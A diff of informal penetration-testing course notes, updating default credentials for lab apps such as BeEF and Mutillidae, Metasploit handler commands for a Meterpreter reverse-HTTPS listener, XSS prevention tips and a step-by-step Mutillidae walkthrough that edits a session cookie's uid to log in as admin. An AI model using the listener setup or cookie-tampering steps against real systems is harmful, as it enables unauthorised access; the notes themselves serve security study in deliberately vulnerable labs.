@@ -19,8 +19,12 @@ Username -> admin
 Password -> password
 
 Beef ->
-username -> beef 
+username -> beef1
 password -> beef1
+
+Mutillidae ->
+username -> demouser1
+password -> demouser1
 
 - Already multiple websites r installed in the metasploit which we can exploit
 
@@ -917,7 +921,7 @@ Note -> do not use virus total bcz it share the results with anti virus programs
 	> use exploit/multi/handler
 	> set PAYLOAD windows/meterpreter/reverse_https
 	> set LHOST ip
-	> set LPORT 8080
+	> set LPORT 8180
 	> exploit // and the listening will start
 	
 - cmd -> cd /var/www/html 
@@ -936,7 +940,35 @@ Note -> do not use virus total bcz it share the results with anti virus programs
  	attack once the payload will got saved the reverse connection will got established
  
  Fixing XSS Vulnerabilities ->
- - 
+ - https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html // it contains also the
+   html encodings which to use
+  - Minimize the usage of user input on html
+  - Escape any untrusted input before inserting it into the page as the XSS can also be inserted into the parameters of html, here
+  escaping means changing the tags as '&' to '&amp' etc
+  - The inserted scripts shold not be treated as scripts instead just html we can do this using functions such as 'htmlspecialchars'
+   in php as this function do not let the scripts to be executed as they r now simple texts.
+   
+Insecure Session Management -> here we will try to bypass login as a admin without a password and manipulating cookies , this can't
+be done always, it is possible only when the session management is programmed that way that it can easily bypassed, look for cookie
+editor firefox on google and add it to browser
+
+- cookies r used to authenticate the users after login, as every time u go to different page u don't need to login, cookies have
+  date of expiry
+Step 1 - login using ur credentials in mutilladae , then to OWASP TOP 10 -> A2 - Broken Authentication... -> Cookies -> then click
+	on top bar for the option View log
+Step 2 - click 'alt' button so the browser to display extra options and then go to Cookie manager and search for the target IP in
+	it and u will see the 'PHPSESSID', 'username' and 'uid' for the login user
+Step 3 -> Edit the uid to '1' as most of the times the admin is the first one to create a account on the website, after edit uid
+	save the cookie and then just refresh the page and now u can see that U r now logged in as admin
+	
+As the cookies r more dynamic and each time different one is used for the user which makes it difficult to work on the cookies 
+
+CSRF Vulnerabilities Discovery -> Screenshot(503)
+- It basically happens when the website doesn't validate if the user wants to do certain tasks such as changing Profile Pic etc and
+in such a case we will be able to program a HTML page and when user runs it they will be forced to carry out certain tasks that we
+program to do such as changing the user passwords without the knowledge of user
+- 
+
 
 --------------------------------------------------------------------------------------------------------------------------------
 
@@ -1219,16 +1251,6 @@ Path Relative StyleSheet injection ->
 
 
 
-
-
-Insure Session Management -> here we will try to bypass login as a admin without a password and manipulating cookies , this can't be done always
-as possible only when the session management is programmed that way that it can easily bypassed, look for cookie editor firefox on google and
-add it to browser
-
-- cookies r used to authenticate the users after login, as every time u go to different page u don't need to login, cookies have date of expiry
-- login using ur credentials in mutilladae , then to OWASP TOP 10 -> A3 - Broken Authentication... -> Cookies -> then click on top bar for the
-option View log
-- click alt on the browser to display extra options
 
 
 
